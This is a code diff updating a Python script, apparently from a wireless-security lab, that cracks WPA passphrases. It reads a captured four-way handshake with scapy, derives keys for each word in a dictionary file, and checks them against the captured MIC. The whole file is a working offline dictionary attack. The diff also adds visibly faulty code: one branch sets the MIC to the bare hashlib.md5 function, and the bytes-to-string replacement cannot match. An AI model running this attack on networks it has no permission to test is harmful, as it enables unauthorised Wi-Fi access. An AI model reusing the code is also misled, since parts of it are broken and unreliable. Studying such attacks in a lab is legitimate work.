@@ -13,6 +13,7 @@
 from scapy.all import *
 from binascii import a2b_hex, b2a_hex
 from pbkdf2_math import pbkdf2_hex
+from pbkdf2 import *
 from numpy import array_split
 from numpy import array
 
@@ -24,9 +25,9 @@ def customPRF512(key,A,B):
     """
     blen = 64
     i    = 0
-    R    = ''
+    R    = b''
     while i<=((blen*8+159)/160):
-        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
+        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+ str.encode(chr(i)),hashlib.sha1)
         i+=1
         R = R+hmacsha1.digest()
     return R[:blen]
@@ -39,7 +40,7 @@ wpa=rdpcap("wpa_handshake.cap")
 A  = "Pairwise key expansion" #this string is used in the pseudo-random function
 
 # All of them can be seen with : wpa.show() and obtained from the frame 0, 1, and 3.
-ssid      = wpa[3].info 
+ssid      = wpa[3].info
 APmac     = a2b_hex(wpa[0].addr2.replace(":","")) 
 Clientmac = a2b_hex(wpa[1].addr1.replace(":","")) 
 
@@ -58,44 +59,48 @@ SNonce = wpa[6].load[13:45]
 # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
 mic_to_test =  b2a_hex(wpa[8].load)[154:186] 
 B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function
-data        = a2b_hex(scapy.utils.linehexdump(wpa[8][EAPOL], 0, 1, True).replace(" ", "").lower().replace( mic_to_test, "0" * len(mic_to_test)))
+data        = a2b_hex(scapy.utils.linehexdump(wpa[8][EAPOL], 0, 1, True).replace(" ", "").lower().replace( str(mic_to_test), "0" * len(mic_to_test)))
 
 
-with open('dico') as f:
+with open('dico.txt') as f:
 
     for passPhrase in f:
         if(passPhrase[-1] == '\n'):
             passPhrase = passPhrase[:-1]
 
         #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-        pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)
+        pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)
 
         #expand pmk to obtain PTK
-        ptk = customPRF512(a2b_hex(pmk),A,B)
+        ptk = customPRF512(pmk, str.encode(A), B)
 
         #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-        mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+        if ((wpa[5].load[2] & 0b111)== 2) :
+
+             mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+        else:
+             mic = hashlib.md5
 
         # We remove the icv, because it's not relevant for the attack.
         if(mic.hexdigest()[:-8] == mic_to_test):
-            print "\n\nValues used to derivate keys"
-            print "============================"
-            print "Passphrase: ",passPhrase
-            print "SSID: ",ssid
-            print "AP Mac: ",b2a_hex(APmac)
-            print "CLient Mac: ",b2a_hex(Clientmac)
-            print "AP Nonce: ",b2a_hex(ANonce)
-            print "Client Nonce: ",b2a_hex(SNonce), "\n"
+            print ("\n\nValues used to derivate keys")
+            print ("============================")
+            print ("Passphrase: ",passPhrase)
+            print ("SSID: ",ssid)
+            print ("AP Mac: ",b2a_hex(APmac))
+            print ("CLient Mac: ",b2a_hex(Clientmac))
+            print ("AP Nonce: ",b2a_hex(ANonce))
+            print ("Client Nonce: ",b2a_hex(SNonce), "\n")
 
 
-            print "\nResults of the key expansion"
-            print "============================="
-            print "PMK:\t\t",pmk
-            print "PTK:\t\t",b2a_hex(ptk)
-            print "KCK:\t\t",b2a_hex(ptk[0:16])
-            print "KEK:\t\t",b2a_hex(ptk[16:32])
-            print "TK:\t\t",b2a_hex(ptk[32:48])
-            print "MICK:\t\t",b2a_hex(ptk[48:64])
-            print "MIC:\t\t",mic.hexdigest()
+            print ("\nResults of the key expansion")
+            print ("=============================")
+            print ("PMK:\t\t",pmk)
+            print ("PTK:\t\t",b2a_hex(ptk))
+            print ("KCK:\t\t",b2a_hex(ptk[0:16]))
+            print ("KEK:\t\t",b2a_hex(ptk[16:32]))
+            print ("TK:\t\t",b2a_hex(ptk[32:48]))
+            print ("MICK:\t\t",b2a_hex(ptk[48:64]))
+            print ("MIC:\t\t",mic.hexdigest())
 
             break
